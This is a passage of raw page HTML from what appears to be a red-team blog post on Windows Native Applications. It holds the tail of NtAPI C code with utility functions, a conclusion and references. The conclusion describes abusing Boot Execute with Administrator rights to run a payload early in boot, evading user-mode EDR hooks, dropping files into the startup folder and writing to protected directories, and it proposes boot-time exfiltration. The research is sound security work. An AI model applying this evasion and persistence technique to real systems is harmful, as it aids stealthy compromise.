data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-9w39d15474"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block255"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-63ux915476"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Cleanup</span></span></p></div><div type="paragraph" data-hook="rcv-block256"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-rfhuf15478"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(hFile != nullptr){</span></span></p></div><div type="paragraph" data-hook="rcv-block257"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-xwfrj15480"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block258"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-j4nrb15482"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NtClose(hFile);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block259"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-vmzrt15484"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block260"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ke0ov15486"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></span></p></div><div type="paragraph" data-hook="rcv-block261"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-b67ti15488"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block262"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ivst915490"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Wait to ensure completion</span></span></p></div><div type="paragraph" data-hook="rcv-block263"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-69mv515492"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; LARGE_INTEGER interval;</span></span></p></div><div type="paragraph" data-hook="rcv-block264"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ezl8b15494"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; interval.QuadPart = -10000 * 5000;</span></span></p></div><div type="paragraph" data-hook="rcv-block265"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-e8jsv15496"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; NtDelayExecution(FALSE, &amp;interval);</span></span></p></div><div type="paragraph" data-hook="rcv-block266"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ehef515498"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block267"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ahop115500"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return status;</span></span></p></div><div type="paragraph" data-hook="rcv-block268"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-m5xnv15502"><span class="vMus0"><span>}</span></span></p></div><div type="paragraph" data-hook="rcv-block269"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-n1s8g15504"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block270"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-8f67015506"><span class="vMus0"><span>VOID* memset(VOID * dest, INT value, SIZE_T count){&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block271"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-kcalv15508"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; UCHAR </span><em style="font-style:italic"><span>&nbsp;p = (UCHAR</span></em><span>) dest;</span></span></p></div><div type="paragraph" data-hook="rcv-block272"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-6qztt15512"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; UCHAR v = (UCHAR)value;</span></span></p></div><div type="paragraph" data-hook="rcv-block273"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-itolt15514"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; while (count--){</span></span></p></div><div type="paragraph" data-hook="rcv-block274"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-jmtmw15516"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *p++ = v;</span></span></p></div><div type="paragraph" data-hook="rcv-block275"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-wbfze15518"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; }</span></span></p></div><div type="paragraph" data-hook="rcv-block276"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-chic815520"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; return dest;</span></span></p></div><div type="paragraph" data-hook="rcv-block277"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-nxbo815522"><span class="vMus0"><span>}</span></span></p></div><div type="paragraph" data-hook="rcv-block278"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-1m3o815524"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block279"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-6mqj815526"><span class="vMus0"><span>SIZE_T wcslen(CONST WCHAR* str){</span></span></p></div><div type="paragraph" data-hook="rcv-block280"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-c1jlv15528"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; SIZE_T len = 0;</span></span></p></div><div type="paragraph" data-hook="rcv-block281"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-lepcw15530"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; while (str[len] != L'\0') {</span></span></p></div><div type="paragraph" data-hook="rcv-block282"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ycbak15532"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; len++;</span></span></p></div><div type="paragraph" data-hook="rcv-block283"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-v5di815534"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; }</span></span></p></div><div type="paragraph" data-hook="rcv-block284"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-2s2c215536"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; return (len);</span></span></p></div><div type="paragraph" data-hook="rcv-block285"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-b737p15538"><span class="vMus0"><span>}</span></span></p></div><div type="paragraph" data-hook="rcv-block286"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-x88h015540"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block287"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-jbs0q15542"><span class="vMus0"><span>VOID* memcpy(VOID* dest, CONST VOID* src, SIZE_T count){</span></span></p></div><div type="paragraph" data-hook="rcv-block288"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-nkxld15544"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; UCHAR </span><em style="font-style:italic"><span>&nbsp;d = (UCHAR </span></em><span>)dest;</span></span></p></div><div type="paragraph" data-hook="rcv-block289"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-s1gdc15548"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; CONST UCHAR </span><em style="font-style:italic"><span>&nbsp;s = (CONST UCHAR </span></em><span>)src;</span></span></p></div><div type="paragraph" data-hook="rcv-block290"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ee4vs15552"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block291"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-tnaai15554"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; // Copy bytes from the source to the destination</span></span></p></div><div type="paragraph" data-hook="rcv-block292"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-g7dfx15556"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; for (SIZE_T i = 0; i &lt; count; i++) {</span></span></p></div><div type="paragraph" data-hook="rcv-block293"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-k6rtm15558"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d[i] = s[i];</span></span></p></div><div type="paragraph" data-hook="rcv-block294"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-futzg15560"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; }</span></span></p></div><div type="paragraph" data-hook="rcv-block295"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ufw6615562"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block296"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-xexwb15564"><span class="vMus0"><span>&nbsp;&nbsp;&nbsp; return dest;</span></span></p></div><div type="paragraph" data-hook="rcv-block297"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ejqmy15566"><span class="vMus0"><span>}</span></span></p></div><div type="paragraph" data-hook="rcv-block298"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-sh9fq15568"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block299"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-4hoyc15569"><span class="vMus0"><span style="color:rgb(47, 84, 150);text-decoration:inherit"><span>&nbsp;</span></span></span></p></div><div type="paragraph" data-hook="rcv-block300"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-65x4s15571"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:24px"><span style="color:#fd6262;text-decoration:inherit"><span>Part V: Conclusion</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block301"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-rvjei15573"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block302"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-tuuam917638"><span class="vMus0"><span>In this writeup, we saw that Native Applications are a unique type of application that we can use by exclusively using NtAPI, and passing in the “Native” option to the “/Subsystem” option at compile time. Because these applications only rely on ntdll, it’s difficult for security solutions to load the dlls that are typically used to hook NtAPI in user mode. Additionally, we saw that with Administrator access we were able to trick the Windows operating system into executing our Native Application very early in the boot process, which allowed us to implement a rudimentary mechanism where we dropped an executable to the %APPDATA% startup folder to trigger calc.exe. We saw that there’s some issues with at least one of the tools in the Sysinternals suite that’s supposed to monitor Boot Execute manipulations. Finally, we saw that this same early access to the file system allowed us to write to directories that we normally wouldn’t be able to access.</span></span></p></div><div type="paragraph" data-hook="rcv-block303"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-bzj9m15575"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block304"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-oo03x927800"><span class="vMus0"><span>Largely omitted from this writeup, but important to mention is that the overhead from leveraging Native Applications is significant. The increased technical difficulty of writing applications that exclusively rely on the NtAPI is a significant challenge. Additionally, by using a Native Application we incur the additional risk of dropping down to disk before detonating our payload. This has numerous disadvantages that are beyond the scope of this writeup but are important considerations during development.</span></span></p></div><div type="paragraph" data-hook="rcv-block305"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-lutoj15577"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block306"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-jd90d930399"><span class="vMus0"><span>Ultimately, what we have here are a largely overlooked set of applications that interface with the Windows operating system without the overhead of the Windows Subsystem, and potentially in a manner that allows for file system access that is difficult to obtain through other means. Future research should look into the exfiltration of information from target systems by using Native Applications during boot, and potentially manipulations that allow for retention of the increased permissions post-initialization of the Windows Subsystem.</span></span></p></div><div type="paragraph" data-hook="rcv-block307"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-e98mt164062"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block308"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-6ojct15579"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:24px"><span style="color:#fd6262;text-decoration:inherit"><span>References</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block309"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-yh2bn15581"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block310"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-i9nu3932672"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(1) Process Ghosting Technique</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block311"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-f57jl15583"><span class="vMus0"><a target="_blank" href="https://github.com/hasherezade/process_ghosting/blob/9afd230c88ad646c0ea2dbcca3aaa11b1d30719a/main.cpp#L114" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>process_ghosting/main.cpp at 9afd230c88ad646c0ea2dbcca3aaa11b1d30719a · hasherezade/process_ghosting · GitHub</span></span></a></span></p></div><div type="paragraph" data-hook="rcv-block312"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-rlppu15585"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block313"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-5hv7m15587"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(2) Windows Native API Programming</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block314"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-hnckp15589"><span class="vMus0"><a target="_blank" href="https://leanpub.com/windowsnativeapiprogramming" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>https://leanpub.com/windowsnativeapiprogramming</span></span></a></span></p></div><div type="paragraph" data-hook="rcv-block315"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-8hbaz15591"><span class="vMus0"><span style="color:#8a8a8a;text-decoration:inherit"><span>&nbsp;</span></span></span></p></div><div type="paragraph" data-hook="rcv-block316"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-go36615593"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(3) Subsystem Wikipedia</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block317"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-pajkp15595"><span class="vMus0"><a target="_blank" href="https://en.wikipedia.org/wiki/Architecture_of_Windows_NT" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>https://en.wikipedia.org/wiki/Architecture_of_Windows_NT</span></span></a></span></p></div><div type="paragraph" data-hook="rcv-block318"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-lksmu15597"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block319"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-8hoi415599"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(4) Amalgamated NtAPI Header File</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block320"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-9jnuk15601"><span class="vMus0"><a target="_blank" href="https://github.com/mrexodia/phnt-single-header" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>https://github.com/mrexodia/phnt-single-header</span></span></a><span style="color:#8a8a8a;text-decoration:inherit"><span>&nbsp;</span></span></span></p></div><div type="paragraph" data-hook="rcv-block321"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-m0a4a15604"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block322"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-9bq6415606"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(5) Tiny Tracer</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block323"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-efazs15608"><span class="vMus0"><a target="_blank" href="https://github.com/hasherezade/tiny_tracer" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>https://github.com/hasherezade/tiny_tracer</span></span></a></span></p></div><div type="paragraph" data-hook="rcv-block324"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-892be15610"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block325"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-zpg5l15612"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(6) NativeRun</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block326"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-hu5gz15614"><span class="vMus0"><a target="_blank" href="https://github.com/zodiacon/winnativeapibooksamples/tree/main/Chapter03/nativerun" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>https://github.com/zodiacon/winnativeapibooksamples/tree/main/Chapter03/nativerun</span></span></a></span></p></div><div type="paragraph" data-hook="rcv-block327"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-7lu3015616"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block328"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ycsdu15618"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(7) x86Matthew NtSockets</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block329"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-4o1ab15620"><span class="vMus0"><a target="_blank" href="https://www.x86matthew.com/view_post?id=ntsockets" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>https://www.x86matthew.com/view_post?id=ntsockets</span></span></a></span></p></div><div type="paragraph" data-hook="rcv-block330"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-uity815622"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block331"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-iqp8015624"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(8) Pavels ListPrivs</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block332"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-zk2vm15626"><span class="vMus0"><a target="_blank" href="https://github.com/zodiacon/NativeApps/blob/master/listprivs/listprivs.cpp" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>https://github.com/zodiacon/NativeApps/blob/master/listprivs/listprivs.cpp</span></span></a></span></p></div><div type="paragraph" data-hook="rcv-block333"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-5fkca15628"><span class="vMus0"><span>&nbsp;</span></span></p></div><div type="paragraph" data-hook="rcv-block334"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-6ak8b15630"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>(9) Pavel’s Native Application Video</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block335"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-aokpz15632"><span class="vMus0"><a target="_blank" href="https://youtu.be/EKBvLTuI2Mo?feature=shared&amp;t=2833" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#8a8a8a;text-decoration:inherit"><span>https://youtu.be/EKBvLTuI2Mo?feature=shared&amp;t=2833</span></span></a></span></p></div><div type="paragraph" data-hook="rcv-block336"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-75piv11150"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block337"></div></div><div type="last" data-hook="rcv-block-last"></div></div></div></div></div></div></section></div></article></div></div></div><div class="zp8IQu zp8s_J"><div><section class="oY1ew3" data-hook="recent-posts" style="--blog-pl-common-padding-top:28px;--blog-pl-common-padding-bottom:25px;--blog-pl-slider-padding-top:16px;--blog-pl-slider-padding-bottom:24px;--blog-pl-header-height:34px;--blog-pl-header-margin-bottom:18px;--blog-pl-footer-content-height:18px;--blog-pl-footer-separator-margin:15px;--blog-pl-footer-padding-top:8px;--blog-pl-common-title-margin:11px;--blog-pl-default-title-margin:10px;--blog-pl-slider-title-margin-top:10px;--blog-pl-category-label-margin-bottom:12px;--blog-pl-slider-category-label-margin-bottom:2px"><section><div class="zHLEBV"><article class="qbu2Gh" data-hook="recent-post-list-item"><div class="dkbPQd"><a aria-label="Benefits of Security Through Obscurity" href="https://www.protexity.com/post/benefits-of-security-through-obscurity" class="blog-link-hover-color" data-hook="link" tabindex="-1"><div class="kkOpHH"><wow-image class="TI1b5D HNM0p2" data-image-info="{&quot;displayMode&quot;:&quot;fill&quot;,&quot;targetWidth&quot;:450,&quot;targetHeight&quot;:253,&quot;isSEOBot&quot;:false,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:610,&quot;height&quot;:410,&quot;uri&quot;:&quot;0628ff_1834c2f9e1a041919103e26942b4476f~mv2.jpg&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG undefined" data-bg-effect-name="" data-has-ssr-src="" style="--wix-img-max-width:max(610px, 100%)"><img alt="Benefits of Security Through Obscurity" data-pin-nopin="true"></wow-image></div></a><div class="ZnRZP5"></div></div></article><article class="qbu2Gh" data-hook="recent-post-list-item"><div class="dkbPQd"><a aria-label="Prevention Is King, Resilience Is Best" href="https://www.protexity.com/post/prevention-is-king-resilience-is-best" class="blog-link-hover-color" data-hook="link" tabindex="-1"><div class="kkOpHH"><wow-image class="TI1b5D HNM0p2" data-image-info="{&quot;displayMode&quot;:&quot;fill&quot;,&quot;targetWidth&quot;:450,&quot;targetHeight&quot;:253,&quot;isSEOBot&quot;:false,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:610,&quot;height&quot;:410,&quot;uri&quot;:&quot;0628ff_1834c2f9e1a041919103e26942b4476f~mv2.jpg&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG undefined" data-bg-effect-name="" data-has-ssr-src="" style="--wix-img-max-width:max(610px, 100%)"><img alt="Prevention Is King, Resilience Is Best" data-pin-nopin="true"></wow-image></div></a><div class="ZnRZP5"></div></div></article><article class="qbu2Gh" data-hook="recent-post-list-item"><div class="dkbPQd"><a aria-label="Pitfalls Of Using MITRE ATT&amp;CK" href="https://www.protexity.com/post/common-pitfalls-of-using-mitre-attack" class="blog-link-hover-color" data-hook="link" tabindex="-1"><div class="kkOpHH"><wow-image class="TI1b5D HNM0p2" data-image-info="{&quot;displayMode&quot;:&quot;fill&quot;,&quot;targetWidth&quot;:450,&quot;targetHeight&quot;:253,&quot;isSEOBot&quot;:false,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:3000,&quot;height&quot;:2000,&quot;uri&quot;:&quot;0628ff_f68c0604331145f8873f2fee2a037440~mv2.jpg&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG undefined" data-bg-effect-name="" data-has-ssr-src="" style="--wix-img-max-width:max(3000px, 100%)"><img alt="Pitfalls Of Using MITRE ATT&amp;CK" data-pin-nopin="true"></wow-image></div></a><div 